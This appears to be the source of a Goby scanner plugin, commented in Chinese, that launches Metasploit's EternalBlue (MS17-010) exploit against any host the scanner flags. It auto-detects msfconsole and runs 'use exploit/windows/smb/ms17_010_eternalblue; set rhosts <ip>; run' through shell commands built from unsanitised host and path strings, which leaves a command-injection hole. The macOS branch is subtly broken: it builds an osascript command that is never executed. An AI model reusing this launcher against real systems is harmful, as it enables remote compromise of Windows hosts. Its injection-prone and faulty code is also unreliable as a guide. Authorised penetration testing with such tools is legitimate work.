let cp = require('child_process');
const os = require('os');
const fs = require('fs');

function activate (content) {
    // msf-vul 对应关系
    let identical = {
        "Eternalblue/DOUBLEPULSAR MS17-010 SMB RCE": "exploit/windows/smb/ms17_010_eternalblue"
    };

    // 跨平台调用命令
    function execCmd(cmd) {
        if (os.type() == 'Windows_NT') {
            // windows
            cp.exec(`start ${cmd}`);
        } else if (os.type() == 'Darwin') {
            // mac
            cp.exec(cmd);
        } else if (os.type() == 'Linux') {
            // Linux
            cp.exec(`bash -c "${cmd}"`);
        }
    }

    // 文件/文件夹是否存在
    function isExists(path) {
        return fs.existsSync(path);
    }

    // 调用msf
    goby.registerCommand('msf', function (content) {
        let config = goby.getConfiguration(); // 获取插件配置
        let ip = content.hostinfo.split(':')[0]; // 获取当前漏洞ip
        let pathArr = ['C:/metasploit-framework/bin', 'D:/metasploit-framework/bin', 'C:/metasploit-framework']; // msf常见安装路径
        let fileArr = ["msfconsole.bat", "msfconsole"]; // msf文件
        
        let urlDefault = '';
        if (config.url.default) {
            urlDefault = config.url.default; // 优先读取用户配置的安装路径
        } else {
            // 根据常见的msf安装路径，判断是否已安装
            pathArr.forEach((v, k) => {
                let pathExists = isExists(v);
                if (pathExists) {
                    fileArr.forEach((fv, fk) => {
                        let fileExists = isExists(v + "/" + fv);
                        if (fileExists) {
                            urlDefault = v + "/" + fv;
                            goby.setConfiguration("url", urlDefault); // 如果安装，自动设置安装路径
                        }
                    })
                }
            })
        }

        if (!urlDefault) return goby.showInformationMessage('Please set the plug-in installation path');

        // 调用msf
        let url = `${urlDefault} -x "use ${identical[content.name]}; set rhosts ${ip} ; run"`
        if (os.type() == 'Darwin') {
            let onlyPath = require('path').dirname(urlDefault);
            url = `cd ${onlyPath}; ./msfconsole -x \\"use ${identical[content.name]}; set rhosts ${ip} ; run\\"`;
            cmd = `osascript -e 'tell application "Terminal" to do script "${url}"'`;
            execCmd(url);
        } else {
            execCmd(url);
        }
    });
    
    // 是否显示利用按钮
    goby.registerCommand('msf_visi', function (content) {
        if (identical[content.name]) return true;
        return false;
    });
}

exports.activate = activate;